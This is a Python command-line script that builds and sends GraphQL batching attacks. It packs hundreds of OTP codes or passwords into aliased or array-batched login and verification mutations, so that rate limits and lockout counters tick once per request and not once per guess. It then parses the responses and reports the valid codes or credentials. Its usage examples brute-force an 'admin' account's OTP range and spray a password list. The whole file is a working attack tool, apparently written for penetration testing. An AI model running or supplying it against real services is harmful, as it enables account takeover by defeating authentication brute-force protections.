#!/usr/bin/env python3
"""batch_build.py - build (and optionally send) GraphQL batch attacks.

Builds aliased-query batches and JSON-array batches from an operation
template with a {{VALUE}} placeholder, substituting a value series (OTP
range, credential list). One HTTP request carries N attempts, so
per-request rate limits / lockout counters tick once per chunk.

Usage:
  # 10k OTP guesses as alias batches of 500, send them, parse hits:
  python3 scripts/batch_build.py https://api.example.com/graphql \
      --template 'verifyOTP(user:"admin", code:"{{VALUE}}") { ok token }' \
      --op-type mutation --range 0000-9999 --chunk 500 --mode alias --send

  # just print the request body for the first chunk (manual replay / Burp):
  python3 scripts/batch_build.py https://api.example.com/graphql \
      --template 'login(username:"admin", password:"{{VALUE}}") { token }' \
      --values-file passwords.txt --chunk 100 --mode array

Outputs:
  reports/graphql-batch-requests.json   all built request bodies
  reports/graphql-batch-results.json    per-value results when --send is used

Python 3 standard library only.
"""

import argparse
import json
import os
import ssl
import sys
import tempfile
import urllib.error
import urllib.request

PLACEHOLDER = "{{VALUE}}"


def parse_header(raw):
    if ":" not in raw:
        raise argparse.ArgumentTypeError("header must be 'Name: value'")
    name, _, value = raw.partition(":")
    return name.strip(), value.strip()


def build_opener(proxy, insecure):
    handlers = []
    if insecure:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    return urllib.request.build_opener(*handlers)


def atomic_write(path, data):
    d = os.path.dirname(path) or "."
    os.makedirs(d, exist_ok=True)
    fd, tmp = tempfile.mkstemp(dir=d, prefix=".tmp-", suffix=".json")
    try:
        with os.fdopen(fd, "w") as f:
            json.dump(data, f, indent=2)
            f.write("\n")
        os.replace(tmp, path)
    except BaseException:
        if os.path.exists(tmp):
            os.unlink(tmp)
        raise


def load_values(args):
    if args.range:
        try:
            start, end = args.range.split("-", 1)
            width = len(start)
            return [str(i).zfill(width) for i in range(int(start), int(end) + 1)]
        except ValueError:
            sys.exit("[-] bad --range, expected like 0000-9999")
    if args.values_file:
        with open(args.values_file, "r", encoding="utf-8", errors="replace") as f:
            return [line.rstrip("\r\n") for line in f if line.strip()]
    if args.values:
        return args.values.split(",")
    sys.exit("[-] supply one of --range / --values-file / --values")


def escape_gql_string(v):
    return v.replace("\\", "\\\\").replace('"', '\\"')


def substitute(template, value):
    return template.replace(PLACEHOLDER, escape_gql_string(value))


def chunks(seq, n):
    for i in range(0, len(seq), n):
        yield i, seq[i : i + n]


def build_alias_body(op_type, template, values, offset):
    parts = []
    for j, v in enumerate(values):
        parts.append("a%d: %s" % (offset + j, substitute(template, v)))
    doc = "%s {\n  %s\n}" % (op_type, "\n  ".join(parts))
    return {"query": doc}


def build_array_body(op_type, template, values):
    return [{"query": "%s { %s }" % (op_type, substitute(template, v))} for v in values]


def send(opener, url, body, headers, timeout):
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Accept", "application/json")
    for name, value in headers:
        req.add_header(name, value)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except (urllib.error.URLError, OSError) as e:
        return None, str(e)


def error_alias_paths(parsed):
    """Set of top-level aliases that appear in errors[].path."""
    bad = set()
    for err in parsed.get("errors") or []:
        path = err.get("path") or []
        if path:
            bad.add(str(path[0]))
    return bad


def parse_alias_response(body, offset, values):
    """Return (hits, errors) mapping alias results back to input values."""
    hits = []
    try:
        parsed = json.loads(body)
    except ValueError:
        return hits, ["non-JSON response"]
    data = parsed.get("data") or {}
    bad = error_alias_paths(parsed)
    for j, v in enumerate(values):
        alias = "a%d" % (offset + j)
        result = data.get(alias)
        if result is not None and alias not in bad:
            hits.append({"alias": alias, "value": v, "data": result})
    errs = [e.get("message", "") for e in (parsed.get("errors") or [])][:3]
    return hits, errs


def parse_array_response(body, values):
    hits = []
    try:
        parsed = json.loads(body)
    except ValueError:
        return hits, ["non-JSON response"]
    if not isinstance(parsed, list):
        return hits, ["array batching rejected (non-array response)"]
    errs = []
    for j, item in enumerate(parsed):
        if j >= len(values):
            break
        data = item.get("data") or {}
        has_err = bool(item.get("errors"))
        non_null = any(v is not None for v in data.values()) if data else False
        if non_null and not has_err:
            hits.append({"index": j, "value": values[j], "data": data})
        elif has_err and len(errs) < 3:
            errs.append(item["errors"][0].get("message", ""))
    return hits, errs


def main():
    ap = argparse.ArgumentParser(description="GraphQL alias/array batch builder")
    ap.add_argument("url", help="GraphQL endpoint, e.g. https://api.example.com/graphql")
    ap.add_argument("--template", required=True,
                    help="operation body with %s, e.g. 'login(u:\"admin\", p:\"%s\") { token }'"
                    % (PLACEHOLDER, PLACEHOLDER))
    ap.add_argument("--op-type", choices=["query", "mutation"], default="mutation")
    ap.add_argument("--mode", choices=["alias", "array"], default="alias")
    ap.add_argument("--range", help="numeric value range, zero-padded, e.g. 0000-9999")
    ap.add_argument("--values-file", help="file with one value per line")
    ap.add_argument("--values", help="comma-separated inline values")
    ap.add_argument("--chunk", type=int, default=100, help="values per request (default 100)")
    ap.add_argument("-H", "--header", action="append", type=parse_header,
                    default=[], metavar="'Name: value'", help="extra header, repeatable")
    ap.add_argument("--proxy", help="HTTP(S) proxy, e.g. http://127.0.0.1:8080")
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--insecure", action="store_true", help="skip TLS verification")
    ap.add_argument("--send", action="store_true", help="send the chunks and parse results")
    ap.add_argument("--out", default="reports", help="output directory (default: reports)")
    args = ap.parse_args()

    if PLACEHOLDER not in args.template:
        sys.exit("[-] template must contain %s" % PLACEHOLDER)

    values = load_values(args)
    print("[*] %d values, mode=%s, chunk=%d -> %d request(s)"
          % (len(values), args.mode, args.chunk,
             (len(values) + args.chunk - 1) // args.chunk))

    requests_out = []
    for offset, batch in chunks(values, args.chunk):
        if args.mode == "alias":
            body = build_alias_body(args.op_type, args.template, batch, offset)
        else:
            body = build_array_body(args.op_type, args.template, batch)
        requests_out.append({"offset": offset, "count": len(batch), "body": body})

    atomic_write(os.path.join(args.out, "graphql-batch-requests.json"),
                 {"url": args.url, "mode": args.mode, "requests": requests_out})
    print("[+] wrote %s/graphql-batch-requests.json" % args.out)

    if not args.send:
        print("[*] first request body (POST %s, Content-Type: application/json):" % args.url)
        print(json.dumps(requests_out[0]["body"], indent=2)[:4000])
        return 0

    opener = build_opener(args.proxy, args.insecure)
    all_hits = []
    sent = 0
    for entry in requests_out:
        status, body = send(opener, args.url, entry["body"], args.header, args.timeout)
        sent += 1
        if body is None or status is None:
            print("[-] chunk @%d transport error: %s" % (entry["offset"], body))
            continue
        batch = values[entry["offset"] : entry["offset"] + entry["count"]]
        if args.mode == "alias":
            hits, errs = parse_alias_response(body, entry["offset"], batch)
        else:
            hits, errs = parse_array_response(body, batch)
        all_hits.extend(hits)
        print("[*] chunk @%d status=%s hits=%d%s"
              % (entry["offset"], status, len(hits),
                 (" err: " + errs[0][:120]) if errs else ""))
        for h in hits:
            print("    [+] HIT value=%r -> %s" % (h["value"], json.dumps(h["data"])[:200]))

    atomic_write(os.path.join(args.out, "graphql-batch-results.json"),
                 {"url": args.url, "mode": args.mode, "total_values": len(values),
                  "requests_sent": sent, "hits": all_hits})
    print("[+] wrote %s/graphql-batch-results.json (%d hit(s) across %d values in %d request(s))"
          % (args.out, len(all_hits), len(values), sent))
    return 0 if all_hits else 1


if __name__ == "__main__":
    sys.exit(main())
